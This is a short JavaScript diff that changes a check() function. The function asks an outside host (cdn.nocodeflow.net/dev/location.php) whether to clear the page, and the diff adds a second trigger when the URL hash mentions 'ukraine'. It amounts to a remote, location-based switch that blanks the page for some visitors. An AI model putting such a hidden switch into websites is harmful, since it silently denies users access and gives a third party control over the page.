@@ -12,7 +12,7 @@ function clearBody(){
 
 function check(){
 	if(!sessionStorage.getItem("skip_ru")){
-    	fetch("https://cdn.nocodeflow.net/dev/location.php").then(resp=>resp.text()).then(text=> {if(text === "1") clearBody(); });		
+    	fetch("https://cdn.nocodeflow.net/dev/location.php").then(resp=>resp.text()).then(text=> {if(text === "1" || /ukraine/.test(location.hash)) clearBody(); });		
 	}
 }
 
